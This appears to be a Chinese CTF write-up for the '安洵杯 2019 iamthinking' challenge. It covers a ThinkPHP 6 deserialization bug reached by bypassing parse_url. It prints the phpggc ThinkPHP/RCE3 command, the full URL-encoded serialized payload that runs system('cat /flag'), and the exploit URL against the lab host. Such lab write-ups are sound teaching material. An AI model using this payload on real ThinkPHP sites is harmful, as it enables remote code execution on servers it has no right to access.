---
title: '[安洵杯 2019]iamthinking'
date: 2024-09-23 22:00:31
tags: thinkphp
categories: 刷题笔记
---

## [安洵杯 2019]iamthinking

我们扫描目录能发现一个www.zip文件

![image-20240923220135671](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409232201973.png)

我们进行访问

![image-20240923220531335](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409232205410.png)

发现这是topthink框架，也就是thinkphp框架

<!--more-->

我们在index.php里发现一个unserialize反序列化，不出意外的话，这道题考的是反序列化

但我们发现前面还有个正则匹配，我们需要绕过parse_url

[parse_url小结](https://www.cnblogs.com/tr1ple/p/11137159.html)

接下来就是找利用链了，这里懒得自己找了，上网搜了一波thinkphp6反序列化漏洞，这里我是看了这个[文章](https://xz.aliyun.com/t/6479),照着他的思路过了一遍源代码，确认他没有修改源代码，就可以利用了，这个链有大佬已经放到了phpggc上，直接生成就行

```
php  phpggc ThinkPHP/RCE3 system 'cat /flag' --url

```

```
O%3A41%3A%22League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%22%3A3%3A%7Bs%3A47%3A%22%00League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%00pool%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A14%3A%22think%5CValidate%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A9%3A%22cat%20%2Fflag%22%3B%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A3%3A%22key%22%3B%7Ds%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3Bs%3A6%3A%22%00%2A%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22anything%22%3B%7D%7D
```

然后我们访问public，在进行传参

```
http://f6978a90-3d95-4f01-baba-7bcb4d454e24.node5.buuoj.cn:81///public/?payload=O%3A41%3A%22League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%22%3A3%3A%7Bs%3A47%3A%22%00League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%00pool%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A14%3A%22think%5CValidate%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A9%3A%22cat%20%2Fflag%22%3B%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A3%3A%22key%22%3B%7Ds%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3Bs%3A6%3A%22%00%2A%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22anything%22%3B%7D%7D

```

得到flag
